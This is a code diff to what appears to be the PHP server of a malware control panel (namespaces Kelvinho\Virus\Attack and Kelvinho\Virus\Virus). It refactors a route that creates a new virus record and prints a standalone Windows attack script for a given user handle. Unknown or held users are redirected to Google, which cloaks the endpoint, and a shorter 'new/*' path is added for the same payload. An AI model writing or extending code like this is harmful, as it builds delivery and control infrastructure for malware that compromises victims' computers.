@@ -4,14 +4,22 @@
 use Kelvinho\Virus\Attack\BaseScriptWin;
 use Kelvinho\Virus\Singleton\Header;
 use Kelvinho\Virus\User\User;
+use Kelvinho\Virus\User\UserFactory;
+use Kelvinho\Virus\Virus\VirusFactory;
 
-$router->get("new/win/*", function () use ($requestData, $userFactory, $virusFactory) {
-    $user_handle = $requestData->getExplodedPath()[2];
+function newWin(string $user_handle, UserFactory $userFactory, VirusFactory $virusFactory) {
     if (!User::exists($user_handle)) Header::redirectToGoogle();
     if ($userFactory->get($user_handle)->isHold()) Header::redirectToGoogle();
     $virus = $virusFactory->new($user_handle);
     echo BaseScriptWin::initStandalone($virus->getVirusId(), $user_handle);
     Header::ok();
+}
+
+$router->get("new/win/*", function () use ($requestData, $userFactory, $virusFactory) {
+    newWin($requestData->getExplodedPath()[2], $userFactory, $virusFactory);
+});
+$router->get("new/*", function () use ($requestData, $userFactory, $virusFactory) {
+    newWin($requestData->getExplodedPath()[1], $userFactory, $virusFactory);
 });
 $router->get("new/win/*/entry/*", function () use ($requestData, $userFactory) {
     $user_handle = $requestData->getExplodedPath()[2];
